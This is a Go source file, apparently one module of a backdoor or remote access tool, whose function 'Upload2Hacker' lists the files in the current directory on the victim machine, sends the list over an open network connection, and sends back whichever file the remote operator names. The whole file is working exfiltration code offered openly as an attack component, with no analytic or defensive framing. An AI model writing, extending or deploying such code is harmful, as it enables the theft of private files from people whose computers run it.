package upload

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"strings"
)

type FilesList struct {
	Files []string
}

type Data struct {
	FileName string
	FileSize int
	FileContent []byte
}


func ReadFileContents(fileName string)([]byte, error){
	file, err := os.Open(fileName)
	if err != nil{
		fmt.Println("[+] Unable to open file")
		return nil, err
	}

	defer file.Close()

	stats, err:= file.Stat()
	FileSize := stats.Size()
	fmt.Println("[+] the File Contains ", FileSize, " bytes")

	bytes := make([]byte, FileSize)

	buffer := bufio.NewReader(file)

	_,err =  buffer.Read(bytes)


	return bytes, err
}


func Upload2Hacker(connection net.Conn)(err error){

	// get a list of files in pwd

	var files []string
	filesArr, _ := ioutil.ReadDir(".")
	for index, file := range filesArr{
		mode := file.Mode()
		if mode.IsRegular(){
			files = append(files, file.Name())
			fmt.Println("\t ", index, "\t", file.Name())
		}
	}

	files_list := &FilesList{Files:files}

	enc := gob.NewEncoder(connection)
	err = enc.Encode(files_list)


	reader := bufio.NewReader(connection)
	fileName2download_raw, err := reader.ReadString('\n')

	fileName2download := strings.TrimSuffix(fileName2download_raw, "\n")

	contents, err := ReadFileContents(fileName2download)

	fs := &Data{
		FileName:    fileName2download,
		FileSize:    len(contents),
		FileContent: contents,
	}

	encoder := gob.NewEncoder(connection)

	err = encoder.Encode(fs)

	return
}